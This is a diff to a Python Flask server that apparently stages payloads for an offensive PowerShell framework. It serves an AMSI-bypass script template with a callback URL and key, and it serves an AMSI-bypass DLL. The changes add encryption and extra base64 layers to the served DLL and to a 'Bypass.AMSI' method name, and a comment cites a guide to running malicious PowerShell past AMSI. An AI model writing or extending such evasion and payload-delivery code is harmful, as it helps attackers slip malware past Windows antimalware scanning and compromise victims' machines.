@@ -112,10 +112,12 @@ def payload_m():
 @app.route('/0')
 def payload_0():
     """Load 0th stage"""
+    method_name = b64encode(encrypt("Bypass.AMSI".encode(), key)).decode()
     context = {
         "modules": modules,
         "callback_url": callback_url,
         "key": key,
+        "method_name": method_name,
     }
     result = render_template(
                     "amsi.ps1",
@@ -144,10 +146,12 @@ def payload_1():
 @app.route('/l')
 def payload_l():
     """Load the AMSI Bypass DLL"""
+    # https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html  # noqa
+
     filename = os.path.join(BASE_DIR, 'binary', 'amsi.dll')
     with open(filename, 'rb') as f:
         DLL = f.read()
-    DLL = b64encode(DLL)
+    DLL = b64encode(encrypt(b64encode(DLL), key))
     return Response(DLL, content_type='text/plain; charset=utf-8')
 
 
